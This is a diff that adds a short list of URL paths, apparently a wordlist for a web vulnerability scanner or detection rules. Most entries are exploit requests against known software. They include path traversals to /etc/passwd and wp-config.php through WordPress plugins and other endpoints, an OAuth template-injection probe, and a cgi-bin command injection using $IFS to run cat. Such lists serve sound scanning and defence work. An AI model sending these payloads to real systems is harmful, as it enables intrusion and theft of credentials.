@@ -1,0 +1,11 @@
+/system/console?.css
+/monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd
+/wp-content/plugins/wsecure/wsecure-config.php
+/XMII/Catalog?Mode=GetFileList&Path=Classes/../../../../../../../../../../../../etc/passwd
+/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test
+/cgi-bin/;cat$IFS/etc/passwd
+/servlets/FetchFile?fileName=../../../etc/passwd
+/command/prima-factory.cgi
